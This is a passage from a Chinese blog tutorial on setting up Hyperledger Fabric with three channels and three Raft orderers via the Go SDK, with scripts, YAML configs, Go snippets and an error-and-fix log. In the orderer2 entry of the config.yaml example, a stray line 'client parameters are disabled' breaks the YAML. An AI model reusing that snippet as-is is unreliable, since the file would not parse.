class="meta">*ApplicationCapabilities</span></span><br></pre></td></tr></table></figure><p>修改完成后需要重新生成通道文件和对应的锚节点文件，直接修改脚本文件（脚本相关操作可以参考之前的<a href="https://baymrx.me/posts/ceba00c5#%E9%87%8D%E6%96%B0%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E5%92%8C%E9%80%9A%E9%81%93%E6%96%87%E4%BB%B6">介绍</a>）。修改后的脚本会生成三个通道文件和五个锚节点文件，其中三个通道对应的<code>channelID</code>分别为mychannel1、mychannel2和mychannel3</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">create.sh</span></span><br><span class="line">rm -rf crypto-config channel-artifacts &amp;&amp; mkdir crypto-config</span><br><span class="line">../../fabric-samples/bin/cryptogen generate --config=crypto-config.yaml</span><br><span class="line">../../fabric-samples/bin/configtxgen -profile OrdererGenesis -outputBlock ./channel-artifacts/genesis.block -channelID fabric-channel</span><br><span class="line">../../fabric-samples/bin/configtxgen -profile ChannelOne -outputCreateChannelTx ./channel-artifacts/channel1.tx -channelID mychannel1</span><br><span class="line">../../fabric-samples/bin/configtxgen -profile ChannelTwo -outputCreateChannelTx ./channel-artifacts/channel2.tx -channelID mychannel2</span><br><span class="line">../../fabric-samples/bin/configtxgen -profile ChannelThree -outputCreateChannelTx ./channel-artifacts/channel3.tx -channelID mychannel3</span><br><span class="line"></span><br><span class="line">../../fabric-samples/bin/configtxgen -profile ChannelOne -outputAnchorPeersUpdate ./channel-artifacts/Org1MSPanchors_ChannelOne.tx -channelID mychannel1 -asOrg Org1MSP</span><br><span class="line">../../fabric-samples/bin/configtxgen -profile ChannelOne -outputAnchorPeersUpdate ./channel-artifacts/Org3MSPanchors_ChannelOne.tx -channelID mychannel1 -asOrg Org3MSP</span><br><span class="line">../../fabric-samples/bin/configtxgen -profile ChannelTwo -outputAnchorPeersUpdate ./channel-artifacts/Org2MSPanchors_ChannelTwo.tx -channelID mychannel2 -asOrg Org2MSP</span><br><span class="line">../../fabric-samples/bin/configtxgen -profile ChannelTwo -outputAnchorPeersUpdate ./channel-artifacts/Org3MSPanchors_ChannelTwo.tx -channelID mychannel2 -asOrg Org3MSP</span><br><span class="line">../../fabric-samples/bin/configtxgen -profile ChannelThree -outputAnchorPeersUpdate ./channel-artifacts/Org3MSPanchors_ChannelThree.tx -channelID mychannel3 -asOrg Org3MSP</span><br><span class="line">./ccp-generate.sh</span><br></pre></td></tr></table></figure><h4 id="config-yaml和main-go">config.yaml和main.go</h4><p>回到项目根目录，<code>main.go</code>和<code>config.yaml</code>就是实现通道创建、安装链码、执行智能合约的客户端代码及其配置文件，每个通道由一个go文件和yaml配置文件来控制操作，所以实现三个通道的测试需要有3份go代码和yaml配置文件，对应通道123分别将go文件命名为main1.go、main2.go、main3.go，yaml文件命名为config1.yaml、config2.yaml、config3.yaml，这三套文件的起始状态都是原先main.go和config.yaml的副本</p><h5 id="config-yaml">config.yaml</h5><p>**client:**这里我将所有的client组织都改为org3，即将原先的org1整体替换为org3</p><p><strong>Channels:</strong> <code>config1.yaml</code>对应<code>mychannel1</code>，相应的peers节点分别为<code>peer0.org1.example.com</code>、<code>peer1.org1.example.com</code>、<code>peer0.org3.example.com</code>，另外两个配置文件中的对应部分以此类推</p><p><strong>Organizations:</strong> 只需要保留通道1所对应的Org1和Org3两个组织，并且Org3中的节点只保留peer0，其他配置文件以此类推</p><p><strong>Peers:</strong> 同上，只保留通道1中所加入的3各节点的信息</p><p><strong>entityMatchers:</strong> 只保留org1和org3的相关信息</p><blockquote><p>至此config1.yaml就修改完成了，别忘了参照上述步骤继续修改2和3的配置文件</p></blockquote><h5 id="main-go">main.go</h5><blockquote><p>以下步骤没有特别说明均指对<code>main1.go</code>的操作，其他go文件以此类推</p></blockquote><p><strong>orgs：</strong> 只保留对应通道的组织，并更改组织锚节点文件的文件名(OrgAnchorFile)和加入对应通道的节点数量(OrgPeerNum) ，比如<code>main1.go</code>中的Org3改为</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">OrgAdminUser:  <span class="string">&quot;Admin&quot;</span>,</span><br><span class="line">OrgName:       <span class="string">&quot;Org3&quot;</span>,</span><br><span class="line">OrgMspId:      <span class="string">&quot;Org3MSP&quot;</span>,</span><br><span class="line">OrgUser:       <span class="string">&quot;User1&quot;</span>,</span><br><span class="line">OrgPeerNum:    <span class="number">1</span>,</span><br><span class="line">OrgAnchorFile: <span class="string">&quot;/home/baymrx/go/src/fabric-go-fabcar/fixtures/channel-artifacts/Org3MSPanchors_ChannelOne.tx&quot;</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><strong>info：</strong> 修改<code>ChannelID</code>和<code>ChannelConfig</code>为对应的通道号（以main1.go为例）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ChannelID:        <span class="string">&quot;mychannel1&quot;</span>,</span><br><span class="line">ChannelConfig:    <span class="string">&quot;/home/baymrx/go/src/fabric-go-fabcar/fixtures/channel-artifacts/channel1.tx&quot;</span>,</span><br></pre></td></tr></table></figure><p><strong>sdk：</strong> 修改<code>sdk, err := sdkInit.Setup(&quot;config.yaml&quot;, &amp;info)</code>配置文件的文件名，即<code>sdk, err := sdkInit.Setup(&quot;config1.yaml&quot;, &amp;info)</code></p><p><strong>ccpPath：</strong> 全部修改为org3的连接配置文件路径，由于默认生成的ccp文件使用的都是peer0，而在channel2中并没有org3的peer0，所以可以拷贝一份<code>connection-org3.yaml</code>的副本，并修改其中的节点名和对应端口供main2.go使用</p><p><strong>network：</strong> <code>network, err := gw.GetNetwork(&quot;mychannel&quot;)</code>改为<code>network, err := gw.GetNetwork(&quot;mychannel1&quot;)</code></p><p><strong>populateWallet()函数：</strong> 将函数中所有的org1都改为 org3</p><h3 id="报错踩坑记录">报错踩坑记录</h3><p><strong>以下列出的报错及解决方案只作为我自己在操作时的踩坑记录，如遇同样报错，不保证解决方案对所有类似问题通用</strong></p><hr><blockquote><p>&gt;&gt; 开始创建通道…<br>&gt;&gt; Create channel and join error: Create channel error: error should be nil for SaveChannel of orgchannel: create channel failed: create channel failed: SendEnvelope failed: calling orderer ‘<a href="http://orderer.example.com:7050">orderer.example.com:7050</a>’ failed: Orderer Server Status Code: (400) BAD_REQUEST. Description: Failing initial channel config creation: mismatched channel IDs: ‘mychannel1’ != ‘channel1’</p></blockquote><p>这里是由于对channelID和channelName没做好区分造成的，只需注意配置文件和代码中用到的通道名都是channelID就行了（如mychannel1），只有在文件路径中才会出现channel*（如channel1.tx）</p><hr><blockquote><p>&gt;&gt;&gt;&gt; 使用每个org的管理员身份更新锚节点配置…<br>&gt;&gt; Create channel and join error: Create channel error: SaveChannel for anchor org Org3 error: create channel failed: create channel failed: SendEnvelope failed: calling orderer ‘<a href="http://orderer.example.com:7050">orderer.example.com:7050</a>’ failed: Orderer Server Status Code: (400) BAD_REQUEST. Description: error applying config update to existing channel ‘mychannel1’: error authorizing update: ConfigUpdate for channel ‘mychannel3’ but envelope for channel ‘mychannel1’</p></blockquote><p>这里是由于把所有的通道配置都放在了一个<code>config.yaml</code>中，将其他不必要的配置删掉即可</p><hr><blockquote><p>&gt;&gt; 开始安装链码…<br>panic: runtime error: index out of range [0] with length 0</p><p>goroutine 1 [running]:<br>fabric-go-fabcar/sdkInit.installCC({0xc000132180?, 0xc00012e008?}, {0xc0011d0000?, 0x1?, 0x1?}, {0xc0001fbaa0, 0x2, 0x1?})<br>/home/baymrx/go/src/fabric-go-fabcar/sdkInit/sdkSetting.go:216 +0x305<br>fabric-go-fabcar/sdkInit.CreateCCLifecycle(0xc000198840, 0xc00022dd10?, 0x40?, 0x1271920?)<br>/home/baymrx/go/src/fabric-go-fabcar/sdkInit/sdkSetting.go:136 +0x233<br>main.main()<br>/home/baymrx/go/src/fabric-go-fabcar/main1.go:76 +0x36a<br>exit status 2</p></blockquote><p>报错问题在于数组出界，跟踪一下代码可以发现问题出在main.go中的orgs数组变量中，由于Org3只有一个peer节点加入Channel1，而数组中对应Org3的<code>OrgPeerNum</code>设置为2，造成运行的时候数组越界，数量改成1就好了</p><hr><blockquote><p>&gt;&gt; 组织认可智能合约定义…<br>&gt;&gt;&gt; chaincode approved by Org1 peers:<br><a href="http://peer0.org1.example.com:7051">peer0.org1.example.com:7051</a><br><a href="http://peer1.org1.example.com:8051">peer1.org1.example.com:8051</a><br>&gt;&gt;&gt; chaincode approved by Org3 peers:<br><a href="http://peer0.org3.example.com:11051">peer0.org3.example.com:11051</a><br>[fabsdk/util] 2022/08/11 07:40:17 UTC - lazyref.(*Reference).refreshValue -&gt; WARN Error - initializer returned error: QueryBlockConfig failed: QueryBlockConfig failed: target(s) required. Will retry again later<br>&gt;&gt; create chaincode lifecycle error: %v queryApprovedCC error: Org Org3 Peer <a href="http://peer0.org3.example.com:11051">peer0.org3.example.com:11051</a> NewInvoker error: Test status Code: (12) UNKNOWN. Description: LifecycleQueryApprovedCC returned error: querying for installed chaincode failed: Transaction processing for endorser [<a href="http://peer0.org3.example.com:11051">peer0.org3.example.com:11051</a>]: Chaincode status Code: (500) UNKNOWN. Description: failed to invoke backing implementation of ‘QueryApprovedChaincodeDefinition’: could not fetch approved chaincode definition (name: ‘fabcar’, sequence: ‘1’) on channel ‘mychannel1’</p><p>exit status 255</p></blockquote><blockquote><p>&gt;&gt; 组织认可智能合约定义…<br>&gt;&gt;&gt; chaincode approved by Org3 peers:<br><a href="http://peer0.org3.example.com:11051">peer0.org3.example.com:11051</a><br><a href="http://peer1.org3.example.com:12051">peer1.org3.example.com:12051</a><br>[fabsdk/util] 2022/08/11 07:44:48 UTC - lazyref.(*Reference).refreshValue -&gt; WARN Error - initializer returned error: QueryBlockConfig failed: no channel peers configured for channel [mychannel3]. Will retry again later<br>&gt;&gt; create chaincode lifecycle error: %v queryApprovedCC error: Org Org3 Peer <a href="http://peer0.org3.example.com:11051">peer0.org3.example.com:11051</a> NewInvoker error: Test status Code: (12) UNKNOWN. Description: LifecycleQueryApprovedCC returned error: querying for installed chaincode failed: Transaction processing for endorser [<a href="http://peer0.org3.example.com:11051">peer0.org3.example.com:11051</a>]: Chaincode status Code: (500) UNKNOWN. Description: failed to invoke backing implementation of ‘QueryApprovedChaincodeDefinition’: could not fetch approved chaincode definition (name: ‘fabcar’, sequence: ‘1’) on channel ‘mychannel3’<br>exit status 255</p></blockquote><p>这两个错误都是搞混了channelID与channel名造成的，在<code>config.yaml</code>中<code>channels:</code>下面的选项错误地使用了<code>channel1</code>，改成<code>mychannel1</code>报错消失</p><hr><blockquote><p>&gt;&gt; 设置链码状态完成<br>Failed to get network: Failed to create new channel client: event service creation failed: could not get chConfig cache reference: QueryBlockConfig failed: QueryBlockConfig failed: queryChaincode failed: Transaction processing for endorser [localhost:7051]: Chaincode status Code: (500) UNKNOWN. Description: channel ‘mychannel’ not found<br>exit status 1</p></blockquote><p>还有未更改的channelID，检索全文，在<code>main.go</code>中有一行代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">network, err := gw.GetNetwork(<span class="string">&quot;mychannel&quot;</span>)</span><br></pre></td></tr></table></figure><p>将<code>mychannel</code>改为<code>mychannel1</code>之后解决问题</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">network, err := gw.GetNetwork(<span class="string">&quot;mychannel1&quot;</span>)</span><br></pre></td></tr></table></figure><hr><blockquote><p>&gt;&gt; 设置链码状态完成<br>Failed to get network: Failed to create new channel client: event service creation failed: could not get chConfig cache reference: QueryBlockConfig failed: QueryBlockConfig failed: queryChaincode failed: Transaction processing for endorser [localhost:7051]: Chaincode status Code: (500) UNKNOWN. Description: channel ‘mychannel3’ not found<br>exit status 1</p></blockquote><p>报错是在执行<code>main3.go</code>，报错信息分析一下，<code>localhost:7051</code>对应的节点找不到<code>mychannel3</code>，7051端口在配置中对应的是Org1的peer0节点，而通道3中只有Org3的peer节点，所以找不到是必然。排查<code>config.yaml</code>，其中的<code>ccpPath</code>路径没有修改，连接配置依然是使用的org1，将其改为org3的路径。同样，将<code>populateWallet()</code>函数中的组织也都改为org3，问题解决</p><hr><blockquote><p>&gt;&gt; 设置链码状态完成<br>Failed to get network: Failed to create new channel client: event service creation failed: could not get chConfig cache reference: QueryBlockConfig failed: QueryBlockConfig failed: queryChaincode failed: Transaction processing for endorser [peer0.org3.example:11051]: Endorser Client Status Code: (2) CONNECTION_FAILED. Description: dialing connection on target [peer0.org3.example:11051]: connection is in TRANSIENT_FAILURE<br>exit status 1</p></blockquote><p>重新生成证书及公私钥文件后，没有清除钱包文件夹，使用<code>rm -rf wallet keystore</code>删除之前的钱包文件即可</p><h2 id="多排序节点搭建">多排序节点搭建</h2><p>多排序节点方案计划使用三个orderer节点和EtcdRaft排序共识算法进行搭建，对应的三个orderer节点的地址及端口号如下</p><blockquote><p>- <a href="http://orderer0.example.com:7050">orderer0.example.com:7050</a></p><p>- <a href="http://orderer1.example.com:8050">orderer1.example.com:8050</a></p><p>- <a href="http://orderer2.example.com:9050">orderer2.example.com:9050</a></p></blockquote><h3 id="配置文件修改-2">配置文件修改</h3><h4 id="configtx-yaml">configtx.yaml</h4><h5 id="Organizations选项：">Organizations选项：</h5><p>需要修改<code>OrdererOrg</code>中的<code>OrdererEndpoints</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">OrdererEndpoints:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">orderer0.example.com:7050</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">orderer1.example.com:8050</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">orderer2.example.com:9050</span></span><br></pre></td></tr></table></figure><h5 id="Orderer选项：">Orderer选项：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># Orderer Type: The orderer implementation to start</span><br><span class="line"># Available types are &quot;solo&quot;, &quot;kafka&quot; and &quot;etcdraft&quot;.</span><br><span class="line">OrdererType: etcdraft</span><br><span class="line">Addresses:</span><br><span class="line">    - orderer0.example.com:7050</span><br><span class="line">    - orderer1.example.com:8050</span><br><span class="line">    - orderer2.example.com:9050</span><br><span class="line">EtcdRaft:</span><br><span class="line">    Consenters:</span><br><span class="line">        - Host: orderer0.example.com</span><br><span class="line">          Port: 7050</span><br><span class="line">          ClientTLSCert: crypto-config/ordererOrganizations/example.com/orderers/orderer0.example.com/tls/server.crt</span><br><span class="line">          ServerTLSCert: crypto-config/ordererOrganizations/example.com/orderers/orderer0.example.com/tls/server.crt</span><br><span class="line">        - Host: orderer1.example.com</span><br><span class="line">          Port: 8050</span><br><span class="line">          ClientTLSCert: crypto-config/ordererOrganizations/example.com/orderers/orderer1.example.com/tls/server.crt</span><br><span class="line">          ServerTLSCert: crypto-config/ordererOrganizations/example.com/orderers/orderer1.example.com/tls/server.crt</span><br><span class="line">        - Host: orderer2.example.com</span><br><span class="line">          Port: 9050</span><br><span class="line">          ClientTLSCert: crypto-config/ordererOrganizations/example.com/orderers/orderer2.example.com/tls/server.crt</span><br><span class="line">          ServerTLSCert: crypto-config/ordererOrganizations/example.com/orderers/orderer2.example.com/tls/server.crt</span><br></pre></td></tr></table></figure><h4 id="crypto-config-yaml">crypto-config.yaml</h4><h5 id="OrdererOrgs选项：">OrdererOrgs选项：</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">OrdererOrgs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">Name:</span> <span class="string">Orderer</span></span><br><span class="line">    <span class="attr">Domain:</span> <span class="string">example.com</span></span><br><span class="line">    <span class="attr">EnableNodeOUs:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">Specs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">Hostname:</span> <span class="string">orderer0</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">Hostname:</span> <span class="string">orderer1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">Hostname:</span> <span class="string">orderer2</span></span><br></pre></td></tr></table></figure><h4 id="docker-compose-yaml">docker-compose.yaml</h4><h5 id="在volumes中添加新的orderer节点">在volumes中添加新的orderer节点</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">orderer0.example.com:</span></span><br><span class="line">  <span class="attr">orderer1.example.com:</span></span><br><span class="line">  <span class="attr">orderer2.example.com:</span></span><br><span class="line">  <span class="attr">peer0.org1.example.com:</span></span><br><span class="line">  <span class="attr">peer0.org2.example.com:</span></span><br><span class="line">  <span class="attr">peer1.org1.example.com:</span></span><br><span class="line">  <span class="attr">peer1.org2.example.com:</span></span><br><span class="line">  <span class="attr">peer0.org3.example.com:</span></span><br><span class="line">  <span class="attr">peer1.org3.example.com:</span></span><br></pre></td></tr></table></figure><h5 id="service中同样添加新节点配置">service中同样添加新节点配置</h5><p>添加后记得修改节点端口和文件路径的映射，以orderer1为例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">orderer1.example.com:</span></span><br><span class="line">  <span class="attr">container_name:</span> <span class="string">orderer1.example.com</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">hyperledger/fabric-orderer:latest</span></span><br><span class="line">  <span class="attr">environment:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">FABRIC_LOGGING_SPEC=DEBUG</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ORDERER_GENERAL_LISTENADDRESS=0.0.0.0</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ORDERER_GENERAL_LISTENPORT=8050</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ORDERER_GENERAL_GENESISMETHOD=file</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ORDERER_GENERAL_GENESISFILE=/var/hyperledger/orderer/orderer.genesis.block</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ORDERER_GENERAL_LOCALMSPID=OrdererMSP</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ORDERER_GENERAL_LOCALMSPDIR=/var/hyperledger/orderer/msp</span></span><br><span class="line">    <span class="comment"># enabled TLS</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ORDERER_GENERAL_TLS_ENABLED=true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ORDERER_GENERAL_TLS_PRIVATEKEY=/var/hyperledger/orderer/tls/server.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ORDERER_GENERAL_TLS_CERTIFICATE=/var/hyperledger/orderer/tls/server.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ORDERER_GENERAL_TLS_ROOTCAS=[/var/hyperledger/orderer/tls/ca.crt]</span></span><br><span class="line">    <span class="comment"># - ORDERER_KAFKA_TOPIC_REPLICATIONFACTOR=1</span></span><br><span class="line">    <span class="comment"># - ORDERER_KAFKA_VERBOSE=true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ORDERER_GENERAL_CLUSTER_CLIENTCERTIFICATE=/var/hyperledger/orderer/tls/server.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ORDERER_GENERAL_CLUSTER_CLIENTPRIVATEKEY=/var/hyperledger/orderer/tls/server.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ORDERER_GENERAL_CLUSTER_ROOTCAS=[/var/hyperledger/orderer/tls/ca.crt]</span></span><br><span class="line">  <span class="attr">working_dir:</span> <span class="string">/opt/gopath/src/github.com/hyperledger/fabric</span></span><br><span class="line">  <span class="attr">command:</span> <span class="string">orderer</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./channel-artifacts/genesis.block:/var/hyperledger/orderer/orderer.genesis.block</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./crypto-config/ordererOrganizations/example.com/orderers/orderer1.example.com/msp:/var/hyperledger/orderer/msp</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./crypto-config/ordererOrganizations/example.com/orderers/orderer1.example.com/tls/:/var/hyperledger/orderer/tls</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">orderer1.example.com:/var/hyperledger/production/orderer</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">8050</span><span class="string">:8050</span></span><br><span class="line">  <span class="attr">networks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">test</span></span><br></pre></td></tr></table></figure><h4 id="config-yaml-2">config.yaml</h4><h5 id="orderers选项">orderers选项</h5><p>三个config文件中将3个排序节点的配置文件都添加上</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">orderers:</span></span><br><span class="line">  <span class="attr">orderer0.example.com:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">orderer0.example.com:7050</span></span><br><span class="line">    <span class="attr">grpcOptions:</span></span><br><span class="line">      <span class="attr">ssl-target-name-override:</span> <span class="string">orderer0.example.com</span></span><br><span class="line">      <span class="attr">keep-alive-time:</span> <span class="string">0s</span></span><br><span class="line">      <span class="attr">keep-alive-timeout:</span> <span class="string">20s</span></span><br><span class="line">      <span class="attr">keep-alive-permit:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">fail-fast:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">allow-insecure:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">tlsCACerts:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/home/baymrx/go/src/fabric-go-fabcar/fixtures/crypto-config/ordererOrganizations/example.com/tlsca/tlsca.example.com-cert.pem</span></span><br><span class="line">  <span class="attr">orderer1.example.com:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">orderer1.example.com:8050</span></span><br><span class="line">    <span class="attr">grpcOptions:</span></span><br><span class="line">      <span class="attr">ssl-target-name-override:</span> <span class="string">orderer1.example.com</span></span><br><span class="line">      <span class="attr">keep-alive-time:</span> <span class="string">0s</span></span><br><span class="line">      <span class="attr">keep-alive-timeout:</span> <span class="string">20s</span></span><br><span class="line">      <span class="attr">keep-alive-permit:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">fail-fast:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">allow-insecure:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">tlsCACerts:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/home/baymrx/go/src/fabric-go-fabcar/fixtures/crypto-config/ordererOrganizations/example.com/tlsca/tlsca.example.com-cert.pem</span></span><br><span class="line">  <span class="attr">orderer2.example.com:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">orderer2.example.com:9050</span></span><br><span class="line">    <span class="attr">grpcOptions:</span></span><br><span class="line">      <span class="attr">ssl-target-name-override:</span> <span class="string">orderer2.example.com</span></span><br><span class="line"><span class="string">client</span> <span class="string">parameters</span> <span class="string">are</span> <span class="string">disabled</span></span><br><span class="line">      <span class="attr">keep-alive-time:</span> <span class="string">0s</span></span><br><span class="line">      <span class="attr">keep-alive-timeout:</span> <span class="string">20s</span></span><br><span class="line">      <span class="attr">keep-alive-permit:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">fail-fast:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">allow-insecure:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">tlsCACerts:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/home/baymrx/go/src/fabric-go-fabcar/fixtures/crypto-config/ordererOrganizations/example.com/tlsca/tlsca.example.com-cert.pem</span></span><br></pre></td></tr></table></figure><h4 id="main-go-2">main.go</h4><h5 id="info参数">info参数</h5><p>修改其中的<code>OrdererEndpoint</code>为<code>orderer0.example.com</code></p><h4 id="sdkInit-sdkSetting-go">sdkInit/sdkSetting.go</h4><p>与上一条相对应，在<code>sdkInit/sdkSetting.go</code>中有几处函数参数原先使用的是固定字符串，需要对应修改为变量</p><p>将代码中的<code>resmgmt.WithOrdererEndpoint(&quot;orderer.example.com&quot;)</code>改为<code>resmgmt.WithOrdererEndpoint(info.OrdererEndpoint)</code>（直接搜索全部替换）</p><h3 id="报错踩坑记录-2">报错踩坑记录</h3><blockquote><p>&gt;&gt; 开始创建通道…<br>&gt;&gt; Create channel and join error: Create channel error: error should be nil for SaveChannel of orgchannel: create channel failed: create channel failed: SendEnvelope failed: calling orderer ‘<a href="http://orderer0.example.com:7050">orderer0.example.com:7050</a>’ failed: Orderer Client Status Code: (2) CONNECTION_FAILED. Description: dialing connection on target [<a href="http://orderer0.example.com:7050">orderer0.example.com:7050</a>]: connection is in TRANSIENT_FAILURE</p><p>&gt;&gt; exit status 255</p></blockquote><p>报错原因是之前误将<code>crypto-config.yaml</code>中的<code>OrdererOrgs</code>改成了下面的配置，按照上面所使用的正确配置即可解决</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">OrdererOrgs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">Name:</span> <span class="string">Orderer0</span></span><br><span class="line">    <span class="attr">Domain:</span> <span class="string">example.com</span></span><br><span class="line">    <span class="attr">EnableNodeOUs:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">Specs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">Hostname:</span> <span class="string">orderer0</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">Name:</span> <span class="string">Orderer1</span></span><br><span class="line">    <span class="attr">Domain:</span> <span class="string">example.com</span></span><br><span class="line">    <span class="attr">EnableNodeOUs:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">Specs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">Hostname:</span> <span class="string">orderer1</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">Name:</span> <span class="string">Ordere2</span></span><br><span class="line">    <span class="attr">Domain:</span> <span class="string">example.com</span></span><br><span class="line">    <span class="attr">EnableNodeOUs:</span> <span class="literal">true</span></span><br><span class="line"> 